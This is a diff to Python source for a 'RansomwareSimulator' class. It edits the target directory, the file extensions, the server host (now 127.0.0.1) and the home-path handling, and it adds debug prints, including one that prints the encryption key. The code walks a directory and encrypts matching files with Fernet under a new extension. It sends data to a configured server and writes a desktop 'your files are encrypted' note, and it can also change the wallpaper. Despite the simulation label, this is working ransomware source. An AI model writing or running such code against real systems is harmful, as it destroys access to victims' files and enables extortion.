@@ -7,6 +7,7 @@ import socket
 import subprocess
 from cryptography.fernet import Fernet
 
+
 class RansomwareSimulator:
     def __init__(self, directory, server_host, server_port, file_extensions):
         self.directory = directory
@@ -17,7 +18,7 @@ class RansomwareSimulator:
 
     def change_wallpaper(self, image_path):
         if os.name == 'nt':
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path , 0)
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
 
         else:
             print("Wallpaper change feature is not supported on this OS.")
@@ -28,21 +29,21 @@ class RansomwareSimulator:
         mac = ':'.join(mac_num[i: i + 2] for i in range(0, 12, 2))
         return mac
 
-
     def create_readme(self):
-        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+        home_dir_path = os.path.join(os.environ.get('USERPROFILE', os.environ.get('HOME', '')))
+        desktop_path = os.path.join(home_dir_path, 'Desktop')
         readme_path = os.path.join(desktop_path, 'Readme.txt')
         with open(readme_path, 'w') as file:
             file.write("This is a simulation program, your files are encrypted.")
 
-
     def encrypt_file(self, file_path):
+        print(f'Used key:{self.key}')
         fernet = Fernet(self.key)
         with open(file_path, 'rb') as file:
             original = file.read()
         encrypted = fernet.encrypt(original)
 
-        encrypted_file_path = file_path + ".denizhalil"
+        encrypted_file_path = file_path + ".is613G6"
         with open(encrypted_file_path, 'wb') as encrypted_file:
             encrypted_file.write(encrypted)
 
@@ -51,7 +52,11 @@ class RansomwareSimulator:
 
     def find_and_encrypt_files(self):
         encrypted_files = []
-        for root, _, files in os.walk(self.directory):
+        print(f'directory:{self.directory}')
+        for root, dirs, files in os.walk(self.directory):
+            print(f"Currently in: {root}")
+            print(f"Subdirectories: {dirs}")
+            print(f"Files: {files}")
             for file in files:
                 if any(file.endswith(ext) for ext in self.file_extensions):
                     file_path = os.path.join(root, file)
@@ -92,19 +97,20 @@ class RansomwareSimulator:
         gc.collect()
         print("Memory cleared.")
 
+
 def main():
-    file_extensions = ['.txt', '.docx', '.jpg']
-    directory = 'dosyalar/'  # 'dosyalar/' should be replaced with the directory path you want to target
-    wallpaper_path = r"duvarkağıtı/araba.jpg"
-    server_host = '10.0.2.37'
+    file_extensions = ['.txt', '.docx', '.zip', '.pdf']
+    directory = '/home/kali/demo/'
+    server_host = '127.0.0.1'
     server_port = 12345
 
     simulator = RansomwareSimulator(directory, server_host, server_port, file_extensions)
     simulator.find_and_encrypt_files()
     simulator.send_data_to_server()
-    simulator.change_wallpaper(wallpaper_path)  # Change the wallpaper
+    # simulator.change_wallpaper(wallpaper_path)  # Change the wallpaper
     simulator.create_readme()
     simulator.clear_memory()
+
 
 if __name__ == "__main__":
     main()
